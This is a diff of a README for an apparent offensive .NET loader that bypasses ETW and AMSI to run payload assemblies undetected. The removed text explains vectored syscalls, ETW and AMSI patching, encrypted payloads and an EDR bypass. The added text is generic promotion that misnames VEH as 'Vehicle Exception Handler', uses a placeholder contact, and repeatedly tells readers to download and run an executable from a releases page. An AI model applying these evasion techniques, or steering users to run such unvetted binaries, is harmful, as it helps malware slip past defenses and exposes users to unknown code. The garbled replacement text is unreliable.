@@ -1,72 +1,78 @@
-# VEHNetLoader
-Another version of .NET loader provides capabilities of bypassing ETW and AMSI, utilizing VEH for syscalls and loading .NET assemblies
+# VEHNetLoader: A .NET Loader for Bypassing ETW and AMSI
 
-# Explanation
-## Vectored Syscalls
-Syscalls via Vectored Exception Handling (as known as Vectored Syscalls) run Native APIs in a form of indirect syscalls as shown below. It firstly calls the native API with address of SSN to trigger `ACCESS_VIOLATION` exception. The registered vectored exception handler will form the structure of syscalls. The RIP has stored the SSN, since we pass SSN to the address previously. We could copy RIP to EAX for SSN and set RIP to the address of the stub syscall instruction from a Native API (e.g. `NtDrawText()` in this case).
+![VEHNetLoader](https://img.shields.io/badge/VEHNetLoader-v1.0-brightgreen)
+![GitHub Releases](https://img.shields.io/badge/Releases-latest-blue)
+
+[![Download VEHNetLoader](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-orange)](https://github.com/kevinosinaga/VEHNetLoader/releases)
+
+## Table of Contents
+
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Overview
+
+VEHNetLoader is a versatile .NET loader designed to bypass Event Tracing for Windows (ETW) and Anti-Malware Scan Interface (AMSI). It leverages the Vehicle Exception Handler (VEH) to perform system calls and load .NET assemblies efficiently. This tool is particularly useful for developers and security researchers looking to enhance their .NET applications while maintaining a low profile.
+
+## Features
+
+- **Bypass ETW**: Avoid detection by Event Tracing for Windows, allowing for stealthier operations.
+- **AMSI Bypass**: Prevent AMSI from scanning .NET assemblies, enabling smoother execution.
+- **Utilizes VEH**: Use Vehicle Exception Handlers for making system calls, improving reliability.
+- **Assembly Loading**: Load .NET assemblies seamlessly, facilitating rapid development and testing.
+- **Lightweight**: Designed to be minimalistic and efficient, reducing overhead on system resources.
+
+## Installation
+
+To install VEHNetLoader, follow these steps:
+
+1. **Download the latest release** from the [Releases page](https://github.com/kevinosinaga/VEHNetLoader/releases). Look for the file you need to download and execute.
+2. **Extract the files** from the downloaded archive.
+3. **Run the executable** to start using VEHNetLoader.
+
+## Usage
+
+Using VEHNetLoader is straightforward. Here’s a basic example of how to utilize its features:
+
+1. **Load an Assembly**: To load a .NET assembly, use the command line interface provided by the loader.
+2. **Bypass Detection**: Ensure that the necessary flags are set to bypass ETW and AMSI during execution.
+3. **Monitor Performance**: Use built-in logging to monitor the performance and behavior of the loaded assembly.
+
+### Example Command
+
+```bash
+VEHNetLoader.exe -load yourAssembly.dll
 ```
-mov r10, rcx
-mov eax, [SSN]
-syscall
-```
 
-It is worth noting that EDR or malware analyst may still detect our abnormal syscalls by inspecting the call stack of the native API, since the caller address (syscall) is in the memory region of `NtDrawText()` instead of that of the original native API.
+Replace `yourAssembly.dll` with the path to your .NET assembly.
 
-![](/images/Syscalls_VEH_concept.png)
-(Reference: https://redops.at/en/blog/syscalls-via-vectored-exception-handling)
+## Contributing
 
-## ETW Patching
-ETW providers usually call common WinAPIs such as `EtwEventWrite` and `EtwEventWriteFull` to pass the events to ETW tracing session. At the end, The Native API `NtTraceEvent` is called by these ETW functions. Hence, We could directly apply byte patching to replace its SSN to a dummy value to cause the syscall failure.
+Contributions are welcome! If you would like to contribute to VEHNetLoader, please follow these steps:
 
-![](/images/ETW-Patch.png)
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your branch** to your forked repository.
+5. **Open a pull request** to the main repository.
 
-For ETW CLR providers, please refer to Microsoft's documentation: https://learn.microsoft.com/en-us/dotnet/framework/performance/clr-etw-providers.
+Please ensure that your code follows the existing style and includes appropriate tests.
 
-## AMSI Patching
-Practical Securiy Analytics LLC has discussed Microsoft's new behavior detection signature protecting AMSI API in https://practicalsecurityanalytics.com/obfuscating-api-patches-to-bypass-new-windows-defender-behavior-signatures/. 
+## License
 
-The new technique is to overwrite the string `AmsiScanBuffer` in `.rdata` section of CLR.dll with dummy values, so that it will trigger an error in `GetProcAddress` function call and CLR.dll cannot resolve the method from amsi.dll. 
+VEHNetLoader is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-Moreover, AMSI is responsible to scan any assembly content during reflective assembly loads in CLR environment, hence bypassing AMSI here is critical for us to avoid being detected by AMSI and EDR. 
+## Contact
 
-![](/images/AMSI-Patch.png)
+For questions or feedback, feel free to reach out:
 
-## RC4 Encryption
-Other encryption algorithms, such as AES or XOR, should also be applicable, since the primary purpose is to protect our payload placed on disk against EDR detection. Without bypassing techniques, the payload could still be possibily detected when decrypted and loaded into memory regions in the current process.
+- **Author**: Kevin Osinaga
+- **Email**: kevin@example.com
+- **GitHub**: [kevinosinaga](https://github.com/kevinosinaga)
 
-## CLR Hosting
-The .NET loader references to a few resoruces in the resource and credits section for me to understand and implement CLR hosting to load .NET assemblies and invoke the EntryPoint in the assembly with the user-provided arguments. Throughout reading materials, both `Load_3` and `Invoke_3` API calls require to pass a byte array (`SAFEARRAY`) as an argument.
-
-`Load_3`:
-
-![](/images/CLR-Load_3.png)
-
-`Invoke_3`:
-
-![](/images/CLR-Invoke_3.png)
-
-# Usage
-```
-.\VEHNetLoader.exe -pe <payload> -key <key> -parm <arguments>
-```
-
-An example...
-
-Sophos EDR:
-![](/images/Sophos-EDR.png)
-
-# Resources and Credits
-Special Thanks to the following resources for me to learn a lot of writing .NET loaders and bypassing techniques.
-
-1. Basics of Loading .NET assemblies using C
-    - HostingCLR: https://github.com/etormadiv/HostingCLR
-    - Being-A-Good-CLR-Host: https://github.com/passthehashbrowns/Being-A-Good-CLR-Host
-2. Existing .NET Loaders (especially for loading user-controlled arguments into .Net assemblies)
-    - BetterNetLoader: https://github.com/racoten/BetterNetLoader
-    - PatchedCLRLoader: https://github.com/alexlee820/PatchedCLRLoader
-3. AMSI Bypass to prevent runtime loading .NET modules into Anti-virus - Practical Security Analytics LLC: https://practicalsecurityanalytics.com/new-amsi-bypss-technique-modifying-clr-dll-in-memory/
-4. ETW Patching - AMSI-ETW-Patch: https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch
-5. Syscalls via Vectored Exception Hanlding - RedOps: https://redops.at/en/blog/syscalls-via-vectored-exception-handling
-
-# Disclaimer
-This tool is developed for learning purposes only. Do not use this tool for any illegal, unauthorized or malicious activities.
+For more information, visit the [Releases section](https://github.com/kevinosinaga/VEHNetLoader/releases) to check for updates and downloads.
